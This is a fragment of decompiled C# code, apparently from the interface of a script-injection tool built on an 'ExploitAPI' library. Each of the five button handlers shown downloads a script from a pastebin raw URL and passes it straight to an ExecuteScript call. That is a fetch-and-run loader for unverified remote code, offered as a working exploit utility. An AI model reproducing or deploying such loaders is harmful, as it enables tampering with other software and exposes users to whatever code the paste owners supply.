			string script = webClient.DownloadString("https://pastebin.com/raw/iYmwv9bN");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000170 RID: 368 RVA: 0x00015098 File Offset: 0x00013298
		private void button98_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/fn4YYRZn");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000171 RID: 369 RVA: 0x000150C8 File Offset: 0x000132C8
		private void button97_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/0QQiQmdi");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000172 RID: 370 RVA: 0x000150F8 File Offset: 0x000132F8
		private void button96_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/bAev2Ri8");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000173 RID: 371 RVA: 0x00015128 File Offset: 0x00013328
		private void button95_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/R3fHyyyy");
			this.module.ExecuteScript(script);
		}

		// Token: 0x04000103 RID: 259
		private ExploitAPI api = new ExploitAPI();

		// Token: 0x04000104 RID: 260
		private Module module = new Module();

		// Token: 0x04000105 RID: 261
		private Point lastPoint;
	}
}
